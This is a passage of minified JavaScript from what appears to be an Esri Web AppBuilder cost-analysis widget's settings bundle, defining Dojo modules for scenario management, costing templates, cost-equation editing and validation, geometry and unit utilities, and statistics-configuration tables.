"esriCTHidden"):w.add(this.noEditableLayersAvailable,"esriCTHidden")},_deleteCostingInfoLayer:function(a){this.costingTemplate[a].destroyRecursive();delete this.costingTemplate[a];delete this.config.costingInfoSettings[a]},_addCostingInfoLayer:function(b){d.some(this.map.itemInfo.itemData.operationalLayers,a.hitch(this,function(a){if(b===a.id&&this._checkEditCapabilities(a.layerObject))return this._createCostingTemplateObj(a),!0}))},onGeographyFieldUpdate:function(a){for(var c in this.costingTemplate)this.costingTemplate[c].updateGeographyOptions(a)}})})},
"widgets/CostAnalysis/setting/ManageScenarios":function(){define("dojo/_base/declare jimu/dijit/Popup jimu/dijit/SimpleTable jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./ManageScenarios.html dojo/_base/array dojo/_base/lang dojo/on dojo/query dojo/dom-attr".split(" "),function(t,r,u,p,g,l,k,a,d,b,q,m){return t([p,g,l],{templateString:k,popup:null,_addScenarioTable:null,baseClass:"jimu-widget-cost-analysis-manage-scenarios",constructor:function(a){d.mixin(this,a)},postMixInProperties:function(){this.nls.common=
{};d.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this._addScenarioTable=this.popup=null;this.inherited(arguments);this._init()},_init:function(){this._createManageScenarioTable();this._createManageScenarioPopup();this.own(b(this.addBtnNode,"click",d.hitch(this,function(){this.scenarioNameNode.set("value",this.scenarioNameNode.get("value").trim());this.scenarioNameNode.validate()?(this._addNewScenario(this._addScenarioTable.getRows().length+1,this.scenarioNameNode.get("value")),
this.scenarioNameNode.set("value"," ")):this.scenarioNameNode.focus()})));this.scenarioNameNode.validator=d.hitch(this,this._scenarioNameValidator);this.scenarioNameNode.focus()},_createManageScenarioPopup:function(){this.popup=new r({titleLabel:this.nls.costingInfo.manageScenarioLabel,content:this.domNode,width:500,height:400,autoHeight:!0,"class":this.baseClass,buttons:[{label:this.nls.common.ok,onClick:d.hitch(this,"onOkButtonClicked")}]})},onOkButtonClicked:function(){this.emit("okButtonClicked",
this._addScenarioTable.getData());this.popup.close()},_createManageScenarioTable:function(){this._addScenarioTable=new u({fields:[{name:"id",title:this.nls.costingInfo.srNoLabel,type:"text",editable:!1,width:"100px"},{name:"field",title:this.nls.costingInfo.scenarioNameLabel,type:"text",editable:!1,width:"200px"},{name:"actions",title:this.nls.costingInfo.deleteLabel,width:"100px",type:"actions",actions:["delete"]}],selectable:!1});this._addScenarioTable.placeAt(this.addScenarioNameTableNode);this._addScenarioTable.startup();
this._populateExistingScenarios();this._addScenarioTable.onBeforeRowDelete=d.hitch(this,function(b){var d,f;this._addScenarioTable.deleteRow(b);b=this._addScenarioTable.getRows();a.forEach(b,function(a,b){d=a.cells[0];f=q("div",d)[0];m.set(f,"innerHTML",b+1);m.set(f,"title",b+1)})})},_populateExistingScenarios:function(){a.forEach(this.existingScenarios,d.hitch(this,function(a,b){this._addNewScenario(b+1,a)}))},_addNewScenario:function(a,b){this._createRow(a,b)},_createRow:function(a,b){this._addScenarioTable.addRow({id:a,
field:b})},_scenarioNameValidator:function(a){return""===a?!1:0<this._addScenarioTable.getRowDataArrayByFieldValue("field",a).length?(this.scenarioNameNode.invalidMessage=this.nls.costingInfo.duplicateScenarioName,!1):!0},getUpdatedManageScenarios:function(){this._addScenarioTable.getRows();q(".simple-table-row",this._addScenarioTable);return[]}})})},"widgets/CostAnalysis/setting/CostingTemplate":function(){define("dojo/_base/declare jimu/dijit/SimpleTable jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./CostingTemplate.html dojo/_base/array dojo/_base/lang dojo/dom-attr dojo/dom-class dojo/on dojo/query dojo/dom-construct dijit/form/Select dijit/form/ValidationTextBox dijit/registry dijit/TooltipDialog dijit/popup ./EditCostEquation ../utils dojo/dom-style".split(" "),
function(t,r,u,p,g,l,k,a,d,b,q,m,f,n,v,w,h,c,e,x,z){return t([u,p,g],{templateString:l,popup:null,_addScenarioTable:null,_featureLayerTemplateOptions:null,baseClass:"jimu-widget-cost-analysis-costing-template",constructor:function(c){a.mixin(this,c)},postMixInProperties:function(){this.nls.common={};a.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this._featureLayerTemplateOptions=this._addScenarioTable=this.popup=null;this.inherited(arguments);b.add(this.domNode,"esriCTLayerTableWrapper");
this._init();this.own(q(this.btnCostingTemplateNode,"click",a.hitch(this,this._addCostingTemplateBtnClicked,!0)))},_init:function(){d.set(this.layerName,"innerHTML",this.layer.title);d.set(this.layerName,"title",this.layer.title);this._createCostingTable()},_createCostingTable:function(){this._addCostingInfoLayerTable=new r({fields:[{name:"field",title:this.nls.costingInfo.featureTemplateTitle,type:"empty",editable:!1,width:"22%"},{name:"field",title:this.nls.costingInfo.costEquationTitle,type:"empty",
editable:!0,width:"22%"},{name:"field",title:this.nls.costingInfo.geographyTitle,type:"empty",editable:!1,width:"22%"},{name:"field",title:this.nls.costingInfo.scenarioTitle,type:"empty",editable:!1,width:"22%"},{name:"actions",title:this.nls.costingInfo.actionTitle,width:"12%",type:"actions",actions:["edit","delete"]}],selectable:!1});this._addCostingInfoLayerTable.placeAt(this.addLayerTableNode);this._addCostingInfoLayerTable.startup();this._addCostingInfoLayerTable.onBeforeRowDelete=a.hitch(this,
function(a){this.config.costingInfoSettings[this.layer.id]&&this.config.costingInfoSettings[this.layer.id].splice(a.rowIndex,1);return!0});this._addHelpIconToHeader();this._createHelpPopups();this._windowEventsPopupClose();this._tableOnBeforeRowEdit();this._populateCostingAssets()},_tableOnBeforeRowEdit:function(){this._addCostingInfoLayerTable.onBeforeRowEdit=a.hitch(this,function(c){var b;b={};b.featureTemplateValue=c.featureTemplateFields.get("value");b.costEquationValue=c.costEquationInput.get("value");
b.geographyValue=c.geographyFields.get("value");b.scenarioValue=c.scenarioFields.get("value");this._editCostEquation=new e({nls:this.nls,map:this.map,config:this.config,layerTitle:this.layer.title,currentRow:c,existingRowValues:b,validateCostEquation:this.validateCostEquation});q(this._editCostEquation,"okButtonClicked",a.hitch(this,function(){this._editCostEquation.destroy()}))})},_createHelpPopups:function(){var a;a=f.create("div",{"class":"esriCTCancelDialogPopup",onclick:function(){c.close(this.costEquationHelpDialog);
return!1}});this.costEquationHelpDialog=new h({"class":this.baseClass,content:a.outerHTML+"\x3cdiv class \x3d 'esriCTDialogText'\x3e"+this.nls.costingInfo.costEquationHelpText+"\x3c/div\x3e",onClick:function(a){b.contains(a.target,"esriCTCancelDialogPopup")||a.stopPropagation()}});this.scenarioHelpDialog=new h({"class":this.baseClass,content:a.outerHTML+"\x3cdiv class \x3d 'esriCTDialogText'\x3e"+this.nls.costingInfo.scenarioHelpText+"\x3c/div\x3e",onClick:function(a){b.contains(a.target,"esriCTCancelDialogPopup")||
a.stopPropagation()}})},_windowEventsPopupClose:function(){q(window.document,"click",a.hitch(this,function(a){b.contains(a.target,"esriCTHelpIcon")||(c.close(this.scenarioHelpDialog),c.close(this.costEquationHelpDialog))}));var e=m(".container-node.jimu-viewstack")[0];e&&q(e,"scroll",a.hitch(this,function(){c.close(this.scenarioHelpDialog);c.close(this.costEquationHelpDialog)}))},_addHelpIconToHeader:function(){var c,b,e,d,x;if(c=m(".simple-table-thead tr",this.domNode)[0])b=c.children[1],e=c.children[3];
d=f.create("div",{"class":"esriCTHelpIcon"},b);x=f.create("div",{"class":"esriCTHelpIcon"},e);q(d,"click",a.hitch(this,function(){this._openHelpPopupDialog(this.costEquationHelpDialog,d)}));q(x,"click",a.hitch(this,function(){this._openHelpPopupDialog(this.scenarioHelpDialog,x)}))},_openHelpPopupDialog:function(a,b){c.open({popup:a,around:b,orient:["above-centered"]})},_addCostingTemplateBtnClicked:function(a){this._addLayerRow(a,null,!0)},_addLayerRow:function(a,c,b){a=a?this._addCostingInfoLayerTable.addRow({}):
this._addCostingInfoLayerTable.addRow({},c.rowIndex+1,!1);if(c=m(".simple-table-cell",a.tr))this._addFeatureTemplateDropdown(c[0],a.tr,b),this._addCostEquationTextBox(c[1],a.tr,b),this._addGeographyDropdown(c[2],a.tr,b),this._addScenarioDropdown(c[3],a.tr,b),this._addCopyRowActionIcon(a.tr)},_addFeatureTemplateDropdown:function(c,b,e){this._featureLayerTemplateOptions||this._getFeatureTemplateOptions();c=f.create("div",{"class":"esriCTDropDownContainer"},c);b.featureTemplateFields=new n({options:a.clone(this._featureLayerTemplateOptions),
"class":"esriCTCostingTemplateFeatureTemplate"});b.featureTemplateFields.placeAt(c);b.featureTemplateFields.startup();c=this.config.costingInfoSettings[this.layer.id];b.featureTemplateFields.set("value",c&&0<c.length&&c[b.rowIndex]&&!e?c[b.rowIndex].featureTemplate:this._featureLayerTemplateOptions[b.rowIndex])},_addGeographyDropdown:function(c,b,e){c=f.create("div",{"class":"esriCTDropDownContainer"},c);b.geographyFields=new n({options:a.clone(this.geographies),"class":"esriCTCostingTemplateGeography"});
b.geographyFields.placeAt(c);b.geographyFields.startup();(c=this.config.costingInfoSettings[this.layer.id])&&0<c.length&&c[b.rowIndex]&&!e?(e=c[b.rowIndex].geography,e=""===e?this.nls.costingInfo.noneValue:e,b.geographyFields.set("value",e)):b.geographyFields.set("value","")},_addScenarioDropdown:function(c,b,e){c=f.create("div",{"class":"esriCTDropDownContainer"},c);b.scenarioFields=new n({options:a.clone(this.scenarios),"class":"esriCTCostingInfoScenarioOptions"});b.scenarioFields.placeAt(c);b.scenarioFields.startup();
(c=this.config.costingInfoSettings[this.layer.id])&&0<c.length&&c[b.rowIndex]&&!e?(e=c[b.rowIndex].scenario,e=""===e?this.nls.costingInfo.noneValue:e,b.scenarioFields.set("value",e)):b.scenarioFields.set("value","")},_addCostEquationTextBox:function(c,b,e){c=f.create("div",{"class":"esriCTTextBoxContainer"},c);b.costEquationInput=new v({"class":"esriCTLayerLabelTextBox esriCTFullWidth",spellcheck:!1});b.costEquationInput.placeAt(c);b.costEquationInput.startup();this._setCostEquation(b.costEquationInput);
b.costEquationInput.validator=a.hitch(this,this.validateCostEquation);(c=this.config.costingInfoSettings[this.layer.id])&&0<c.length&&c[b.rowIndex]&&!e&&(e=c[b.rowIndex].costEquation,b.costEquationInput.set("value",e))},_populateCostingAssets:function(){this.config.costingInfoSettings&&this.config.costingInfoSettings.hasOwnProperty(this.layer.id)?k.forEach(this.config.costingInfoSettings[this.layer.id],a.hitch(this,function(){this._addLayerRow(!0)})):0<this.layer.layerObject.templates.length?k.forEach(this.layer.layerObject.templates,
a.hitch(this,function(){this._addLayerRow(!0)})):0<this.layer.layerObject.types.length&&k.forEach(this.layer.layerObject.types,a.hitch(this,function(){this._addLayerRow(!0)}))},_getFeatureTemplateOptions:function(){this._featureLayerTemplateOptions=[];0<this.layer.layerObject.templates.length?k.forEach(this.layer.layerObject.templates,a.hitch(this,function(a){this._featureLayerTemplateOptions.push({label:a.name,value:a.name})})):0<this.layer.layerObject.types.length&&k.forEach(this.layer.layerObject.types,
a.hitch(this,function(a){this._featureLayerTemplateOptions.push({label:a.templates[0].name,value:a.templates[0].name})}))},updateScenarioOptions:function(c){var b;b=m(".esriCTCostingInfoScenarioOptions",this.domNode);k.forEach(b,a.hitch(this,function(a){w.byNode(a).set("options",c)}));this.scenarios=c},_setCostEquation:function(a){var c;c=this.layer.layerObject.geometryType;"esriGeometryPolyline"===c||"esriGeometryPolygon"===c?a.set("value","{MEASURE}"):a.set("value","{TOTALCOUNT}")},validateCostEquation:function(a){return x.validateEquation(a)},
getUpdatedCostingInfo:function(){var c,b=[],e={};c=this._addCostingInfoLayerTable.getRows();k.forEach(c,a.hitch(this,function(a){a.featureTemplateFields&&a.costEquationInput&&a.geographyFields&&a.scenarioFields&&(e={},a.featureTemplateFields&&(e.featureTemplate=a.featureTemplateFields.get("value")),a.costEquationInput&&(e.costEquation=a.costEquationInput.get("value")),a.geographyFields&&(e.geography=a.geographyFields.get("value")),a.scenarioFields&&(e.scenario=a.scenarioFields.get("value")),b.push(e))}));
return b},_addCopyRowActionIcon:function(c){var b,e;b=m(".action-item-parent",c)[0];e=m(".jimu-icon-edit",c)[0];setTimeout(function(){m(".action-item-parent",c)[0]&&z.set(m(".action-item-parent",c)[0],"width","60px")},100);b&&(c.copyDiv=f.create("div",{"class":"action-item jimu-float-leading row-edit-div jimu-icon jimu-icon-copy",title:this.nls.costingInfo.copyRowTitle},b),f.place(c.copyDiv,e,"after"),this.own(q(c.copyDiv,"click",a.hitch(this,this._copyRow,c))))},_copyRow:function(a){this._addLayerRow(!1,
a);this._setCopyLayerValues(a)},_setCopyLayerValues:function(a){var c=this._addCostingInfoLayerTable.getRows()[a.rowIndex+1];c.featureTemplateFields.set("value",a.featureTemplateFields.get("value"));c.costEquationInput.set("value",a.costEquationInput.get("value"));c.geographyFields.set("value",a.geographyFields.get("value"));c.scenarioFields.set("value",a.scenarioFields.get("value"))},updateGeographyOptions:function(c){c&&(this.geographies=c);c=m(".esriCTCostingTemplateGeography",this.domNode);k.forEach(c,
a.hitch(this,function(c){w.byNode(c).set("options",a.clone(this.geographies));w.byNode(c).startup()}))}})})},"widgets/CostAnalysis/setting/EditCostEquation":function(){define("dojo/_base/declare jimu/dijit/Popup jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./EditCostEquation.html dojo/_base/lang dojo/on dojo/dom-class dojo/query dojo/dom-attr".split(" "),function(t,r,u,p,g,l,k,a,d,b,q){return t([u,p,g],{templateString:l,popup:null,baseClass:"jimu-widget-cost-analysis-edit-equation",
constructor:function(a){k.mixin(this,a)},postMixInProperties:function(){this.nls.common={};k.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this.popup=null;this.inherited(arguments);this._init()},_init:function(){this._createEditLayerRowPopup()},_createEditLayerRowPopup:function(){var a;this.popup=new r({titleLabel:this.layerTitle+": "+this.existingRowValues.featureTemplateValue,content:this.domNode,width:600,height:515,autoHeight:!0,"class":this.baseClass,buttons:[{label:this.nls.common.ok,
onClick:k.hitch(this,"onOkButtonClicked")},{label:this.nls.common.cancel,classNames:["jimu-btn-vacation"],onClick:k.hitch(this,"onCancelButtonClicked")}]});a=b(".title-label",this.popup.domNode)[0];q.set(a,"title",this.layerTitle+": "+this.existingRowValues.featureTemplateValue);this._setRowPopupValues()},onOkButtonClicked:function(){d.contains(this.costEquationValue.domNode,"esriCTCostEquationError")?alert(this.nls.costingInfo.validCostEquationMessage):(this.currentRow.costEquationInput.set("value",
this.costEquationValue.getValue()),this.popup.close())},onCancelButtonClicked:function(){this.popup.close()},_setRowPopupValues:function(){var b,d;b=""===this.existingRowValues.geographyValue?this.nls.costingInfo.noneValue:this.existingRowValues.geographyValue;d=""===this.existingRowValues.scenarioValue?this.nls.costingInfo.noneValue:this.existingRowValues.scenarioValue;this.geographyValue.set("value",b);this.scenarioValue.set("value",d);this.costEquationValue.set("value",this.existingRowValues.costEquationValue);
a(this.costEquationValue,"KeyUp",k.hitch(this,function(a){this._costEquationKeyUp(a)}));this.costEquationHint.innerHTML=this.nls.costingInfo.hintText},_costEquationKeyUp:function(a){var b;b=this.costEquationValue.domNode;d.contains(b,"esriCTCostEquationError")&&d.remove(b,"esriCTCostEquationError");this.validateCostEquation(a.currentTarget.value)||d.add(b,"esriCTCostEquationError")}})})},"widgets/CostAnalysis/utils":function(){define("esri/request esri/geometry/geometryEngine dojo/Deferred dojo/_base/lang jimu/dijit/Message dojo/_base/array".split(" "),
function(t,r,u,p,g,l){var k={};k.units={feet:{lengthUnit:"feet",areaUnit:"square-feet",bufferUnit:"UNIT_FOOT",lengthAbbr:window.jimuNls.units.feetAbbr,areaAbbr:window.jimuNls.units.squareFeetAbbr},meters:{lengthUnit:"meters",areaUnit:"square-meters",bufferUnit:"UNIT_METER",lengthAbbr:window.jimuNls.units.metersAbbr,areaAbbr:window.jimuNls.units.squareMetersAbbr},miles:{lengthUnit:"miles",areaUnit:"square-miles",bufferUnit:"UNIT_STATUTE_MILE",lengthAbbr:window.jimuNls.units.milesAbbr,areaAbbr:window.jimuNls.units.squareMilesAbbr},
yards:{lengthUnit:"yards",areaUnit:"square-yards",bufferUnit:"UNIT_SURVEY_YARD",lengthAbbr:window.jimuNls.units.yardsAbbr,areaAbbr:window.jimuNls.units.squareYardsAbbr},kilometers:{lengthUnit:"kilometers",areaUnit:"square-kilometers",bufferUnit:"UNIT_KILOMETER",lengthAbbr:window.jimuNls.units.kilometersAbbr,areaAbbr:window.jimuNls.units.squareKilometerAbbr}};k.switchToTab=function(a,d){a.selectTab(d)};k.removeNegativeExponents=function(a){return 1<a.toString().toLowerCase().split("e-").length?0:a};
k.applyRounding=function(a,d){var b;if(isNaN(d)||null===d)d=2;b=Math.pow(10,d);a=Math.round(a*b)/b;return a=a.toFixed(d)};k.getLengthOfGeometry=function(a,d){var b,g;b=0;(g=r.simplify(a))&&(b=a.spatialReference.isWebMercator()||4326===a.spatialReference.wkid?r.geodesicLength(g,d):r.planarLength(g,d));return b};k.getAreaOfGeometry=function(a,d){var b,g;g=r.simplify(a);b=0;g&&(b=a.spatialReference.isWebMercator()||4326===a.spatialReference.wkid?r.geodesicArea(g,d):r.planarArea(g,d));return b};k.deleteFeatures=
function(a,d){var b=new u;t({url:a+"/deleteFeatures",content:{where:d,f:"json"}},{usePost:!0}).then(p.hitch(this,function(a){b.resolve(a)}),function(){b.reject(!1)});return b.promise};k.getUnitsAbbreviation=function(a,d){var b="";if("esriGeometryPolygon"===a||"polygon"===a)b=k.units[d].areaAbbr;else if("esriGeometryPolyline"===a||"polyline"===a)b=k.units[d].lengthAbbr;return b};k.roundProjectCostValue=function(a,d){var b=0;d=parseFloat(d);switch(a){case "nearestWholeNumber":b=d.toFixed();break;case "nearestTen":b=
eval(d.toFixed())/10;b=10*eval(b.toFixed());break;case "nearestHundred":b=eval(d.toFixed())/100;b=100*eval(b.toFixed());break;case "nearestThousand":b=eval(d.toFixed())/1E3;b=1E3*eval(b.toFixed());break;case "nearestTenThousands":b=eval(d.toFixed())/1E4;b=1E4*eval(b.toFixed());break;default:b=d.toFixed(2)}return b};k.getPrjAssetTableFields=function(a){var d={};l.forEach(a.fields,p.hitch(this,function(a){"ASSETGUID"===a.name.toUpperCase()?d.ASSETGUID=a.name:"COSTEQUATION"===a.name.toUpperCase()?d.COSTEQUATION=
a.name:"SCENARIO"===a.name.toUpperCase()?d.SCENARIO=a.name:"TEMPLATENAME"===a.name.toUpperCase()?d.TEMPLATENAME=a.name:"GEOGRAPHYGUID"===a.name.toUpperCase()?d.GEOGRAPHYGUID=a.name:"PROJECTGUID"===a.name.toUpperCase()&&(d.PROJECTGUID=a.name)}));d.OBJECTID=a.objectIdField;return d};k.getPrjLayerFields=function(a){var d={};l.forEach(a.fields,p.hitch(this,function(a){"PROJECTNAME"===a.name.toUpperCase()?d.PROJECTNAME=a.name:"DESCRIPTION"===a.name.toUpperCase()?d.DESCRIPTION=a.name:"TOTALASSETCOST"===
a.name.toUpperCase()?d.TOTALASSETCOST=a.name:"GROSSPROJECTCOST"===a.name.toUpperCase()?d.GROSSPROJECTCOST=a.name:"GLOBALID"===a.name.toUpperCase()&&(d.GLOBALID=a.name)}));return d};k.getPrjMultiplierFields=function(a){var d={};l.forEach(a.fields,p.hitch(this,function(a){"DESCRIPTION"===a.name.toUpperCase()?d.DESCRIPTION=a.name:"TYPE"===a.name.toUpperCase()?d.TYPE=a.name:"VALUE"===a.name.toUpperCase()?d.VALUE=a.name:"COSTINDEX"===a.name.toUpperCase()?d.COSTINDEX=a.name:"PROJECTGUID"===a.name.toUpperCase()&&
(d.PROJECTGUID=a.name)}));d.OBJECTID=a.objectIdField;return d};k.showMessage=function(a){(new g({message:a})).message=a};k.evaluate=function(a){return(new Function("return "+a))()};k.validateEquation=function(a){var d;if(""===a||-1<a.indexOf("\x26")||-1<a.indexOf("|")||-1<a.indexOf(","))return!1;a=a.replace(/{measure}/ig,1);a=a.replace(/{totalmeasure}/ig,1);a=a.replace(/{totalcount}/ig,1);if(-1!==a.indexOf("{")||-1!==a.indexOf("}"))return!1;try{return d=k.evaluate(a),isFinite(d)?!0:!1}catch(b){return!1}};
return k})},"widgets/CostAnalysis/setting/StatisticsSettings":function(){define("dojo/_base/declare jimu/BaseWidget jimu/dijit/SimpleTable dojo/on dojo/_base/array dojo/query dojo/dom-construct dijit/form/Select dijit/form/ValidationTextBox dijit/_WidgetsInTemplateMixin dojo/text!./StatisticsSettings.html dojo/_base/lang dojo/store/Memory dojo/dom-class dijit/registry dojo/_base/html dojo/dom-style".split(" "),function(t,r,u,p,g,l,k,a,d,b,q,m,f,n,v,w,h){return t([r,b],{templateString:q,baseClass:"jimu-widget-cost-analysis-statistics-settings",
_layerNameStore:null,_commonStatisticsStoreOption:null,_polygonStatisticsStoreOption:null,_polylineStatisticsStoreOption:null,_pointLayerStatisticsStore:null,_polygonLayerStatisticsStore:null,_polylineLayerStatisticsStore:null,_layerFieldStore:{},_shapeFields:"shape_length shape_area shape__length shape__area shape.len shape.area".split(" "),constructor:function(a){m.mixin(this,a)},postMixInProperties:function(){this.nls.common={};m.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this._polylineLayerStatisticsStore=
this._polygonLayerStatisticsStore=this._pointLayerStatisticsStore=this._polylineStatisticsStoreOption=this._polygonStatisticsStoreOption=this._commonStatisticsStoreOption=this._layerNameStore=null;this._layerFieldStore={};this.inherited(arguments);this._init();this._handleClickEvent()},_handleClickEvent:function(){this._addButtonClick();this._crossButtonClick();this._upButtonClick();this._downButtonClick()},_init:function(){this._createStatisticsStoreOptions();this._createStatisticsTable();this._layerNameStore||
this._createLayerNameStore();this._attachNodeEvents();this._setConfig();this._displayAddStatisticsButtonOrLabel();this._handleActionButtonVisibility()},_displayAddStatisticsButtonOrLabel:function(){this.showActionButtonsInColumn?n.remove(this.btnAddStatisticsNodeWrapper,"esriCTHidden"):n.add(this.btnAddStatisticsNodeWrapper,"esriCTHidden")},_setConfig:function(){this.config&&this.config.statisticsSettings&&0<this.config.statisticsSettings.length&&g.forEach(this.config.statisticsSettings,m.hitch(this,
function(a){this._addLayerRow(a)}))},getConfig:function(){var a,b;a=this._statisticsLayerTable.getRows();b=[];g.forEach(a,m.hitch(this,function(a){b.push({id:a.layerNameDropDown.getValue(),type:a.statisticsTypeDropdown.getValue(),field:a.layerFieldDropdown.getValue(),label:a.statisticsLabelTextBox.getValue()})}));return b},_createStatisticsStoreOptions:function(){this._commonStatisticsStoreOption=[{name:this.nls.statisticsType.averageLabel,value:"avg"},{name:this.nls.statisticsType.countLabel,value:"count"},
{name:this.nls.statisticsType.maxLabel,value:"max"},{name:this.nls.statisticsType.minLabel,value:"min"},{name:this.nls.statisticsType.summationLabel,value:"sum"}];this._polygonStatisticsStoreOption=[{name:this.nls.statisticsType.areaLabel,value:"area"}];this._polylineStatisticsStoreOption=[{name:this.nls.statisticsType.lengthLabel,value:"length"}]},_attachNodeEvents:function(){0===this._layerNameStore.data.length?(n.remove(this.noEditableLayersAvailable,"esriCTHidden"),n.add(this.btnAddStatisticsNodeWrapper,
"esriCTHidden"),n.add(this.statisticsLayerTableNode,"esriCTHidden")):(n.add(this.noEditableLayersAvailable,"esriCTHidden"),n.remove(this.btnAddStatisticsNodeWrapper,"esriCTHidden"),n.remove(this.statisticsLayerTableNode,"esriCTHidden"));this.own(p(this.btnAddStatisticsNode,"click",m.hitch(this,function(){this._layerNameStore.data.length&&(this._addStatisticsBtnClicked(),this.resetAddNewStatisticsDropdown())})))},_createStatisticsTable:function(){var a;this._statisticsLayerTable=new u({fields:[{name:"editable",
title:this.nls.statisticsSettings.selectDeselectAllTitle,type:"checkbox",editable:!1,width:this.showActionButtonsInRow?"16px":"0%",hidden:!this.showActionButtonsInRow},{name:"field",title:this.nls.common.layer,type:"empty",editable:!1,width:"30%"},{name:"field",title:this.nls.common.type,type:"empty",editable:!0,width:this.showActionButtonsInRow?"19%":"18%"},{name:"field",title:this.nls.statisticsSettings.fieldNameTitle,type:"empty",editable:!1,width:"22%"},{name:"field",title:this.nls.statisticsSettings.statisticsTitle,
type:"empty",editable:!1,width:this.showActionButtonsInRow?"55px":"20%"},{name:"actions",title:this.nls.common.actions,width:"10%",type:"actions",actions:["up","down","delete"],hidden:!this.showActionButtonsInColumn}],selectable:!1});this._statisticsLayerTable.placeAt(this.statisticsLayerTableNode);this._statisticsLayerTable.startup();(a=l(".esriCTAddLayerTableNode th .label")[0])&&n.add(a,"esriCTHidden")},_addButtonClick:function(){!0===this.showActionButtonsInRow?(n.remove(this.btnAddNode,"esriCTHidden"),
this.own(p(this.btnAddNode,"click",m.hitch(this,function(){this._layerNameStore.data.length&&(this._addStatisticsBtnClicked(),this._handleActionButtonVisibility(),this.resetAddNewStatisticsDropdown())})))):n.add(this.btnAddNode,"esriCTHidden")},_crossButtonClick:function(){n.remove(this.btnCrossNode,"esriCTHidden");this.own(p(this.btnCrossNode,"click",m.hitch(this,this._deleteLayerRow)))},_upButtonClick:function(){n.remove(this.btnUpNode,"esriCTHidden");this.own(p(this.btnUpNode,"click",m.hitch(this,
function(){var a,b;b=this._statisticsLayerTable.getRows();var d=this._statisticsLayerTable.getData();g.forEach(d,m.hitch(this,function(c,e){c.editable&&(a=b[e])}));this._statisticsLayerTable.onBeforeRowUp(a)&&(d=g.indexOf(b,a),0<d&&(d=b[d-1]))&&(w.place(a,d,"before"),this._statisticsLayerTable.updateUI(),this._statisticsLayerTable.emit("row-up",a))})))},_downButtonClick:function(){n.remove(this.btnDownNode,"esriCTHidden");this.own(p(this.btnDownNode,"click",m.hitch(this,function(){var a,b;b=this._statisticsLayerTable.getRows();
var d=this._statisticsLayerTable.getData();g.forEach(d,m.hitch(this,function(c,e){c.editable&&(a=b[e])}));this._statisticsLayerTable.onBeforeRowDown(a)&&(d=g.indexOf(b,a),d<b.length-1&&(d=b[d+1]))&&(w.place(a,d,"after"),this._statisticsLayerTable.updateUI(),this._statisticsLayerTable.emit("row-down",a))})))},_deleteLayerRow:function(){var a=this._statisticsLayerTable.getRows(),b=this._statisticsLayerTable.getData();g.forEach(b,m.hitch(this,function(c,b){c.editable&&this._statisticsLayerTable.deleteRow(a[b])}));
0===this._statisticsLayerTable.getRows().length&&(b=l("th .checkbox")[0],n.contains(b,"checked")&&n.remove(b,"checked"));this._handleActionButtonVisibility()},_checkEditCapabilities:function(a){var c;return(c=a.capabilities)&&-1!==c.indexOf("Delete")&&-1!==c.indexOf("Create")&&-1!==c.indexOf("Update")&&a.globalIdField?!0:!1},_addStatisticsBtnClicked:function(){var a;this._addLayerRow();a=l(".simple-table-title .jimu-checkbox",this.domNode)[0];p(v.byNode(a),"change",m.hitch(this,function(){setTimeout(m.hitch(this,
function(){this._handleActionButtonVisibility()}),0)}))},_handleActionButtonVisibility:function(){var a,b,d=0,f;a=this._statisticsLayerTable.getRows();f=l(".simple-table-title .jimu-checkbox",this.domNode)[0];f=v.byNode(f);g.some(this._statisticsLayerTable.getRows(),m.hitch(this,function(a){b=l(".jimu-checkbox",a)[0];v.byNode(b).checked&&d++}));0===d?n.replace(this.btnCrossNode,"esriCTDeleteStatisticsIconDisable","esriCTDeleteStatisticsIcon"):n.replace(this.btnCrossNode,"esriCTDeleteStatisticsIcon",
"esriCTDeleteStatisticsIconDisable");a&&1===d?(n.replace(this.btnUpNode,"esriCTStatisticsUpIcon","esriCTStatisticsUpIconDisable"),n.replace(this.btnDownNode,"esriCTStatisticsDownIcon","esriCTStatisticsDownIconDisable")):(n.replace(this.btnUpNode,"esriCTStatisticsUpIconDisable","esriCTStatisticsUpIcon"),n.replace(this.btnDownNode,"esriCTStatisticsDownIconDisable","esriCTStatisticsDownIcon"));0===a.length?(f.set("status",!1),n.add(f.domNode,"jimu-state-disabled")):(f.set("status",!0),n.remove(f.domNode,
"jimu-state-disabled"))},_addLayerRow:function(a){var c,b,d;c=this._statisticsLayerTable.addRow({});b=l(".simple-table-cell",c.tr);d=l(".simple-table-cell .jimu-checkbox",c.tr)[0];b&&(d&&p(v.byNode(d),"change",m.hitch(this,function(){this._handleActionButtonVisibility()})),c=c.tr,this._addLayerNameDropdown(b[1],c,a),this._addStatisticsDropdown(b[2],c,a),this._addLayerFieldDropdown(b[3],c,a),this._addStatisticsLabelTextBox(b[4],c,a))},_onLayerNameChange:function(a,b,d){var c;this._layerNameStore.data.length&&
(c=this._layerNameStore.data[this._layerNameStore.index[a]].geometryType,c=this._getStatisticsTypeStore(c),b.statisticsTypeDropdown.setStore(c),d&&d.type&&b.statisticsTypeDropdown.set("value",d.type),d=b.statisticsTypeDropdown.getValue(),a=this._layerNameStore.data[this._layerNameStore.index[a]].value,this._layerFieldStore[a]||this._createFieldStore(a),b.layerFieldDropdown.setStore(this._layerFieldStore[a]),b.layerFieldDropdown.reset(),this._onStatisticsTypeChange(d,b))},_onStatisticsTypeChange:function(a,
b,d){"count"===a||"length"===a||"area"===a?n.add(b.layerFieldDropdown.domNode,"esriCTHidden"):(n.remove(b.layerFieldDropdown.domNode,"esriCTHidden"),d&&d.field&&b.layerFieldDropdown.set("value",d.field));this._resetStatisticsTypeWidth(b)},_addLayerNameDropdown:function(c,b,d){c=k.create("div",{"class":"esriCTDropDownContainer"},c);b.layerNameDropDown=new a({name:"layerSelect",store:this._layerNameStore,labelAttr:"name","class":"esriCTLayerNameDropdown"},c);d&&d.id&&b.layerNameDropDown.set("value",
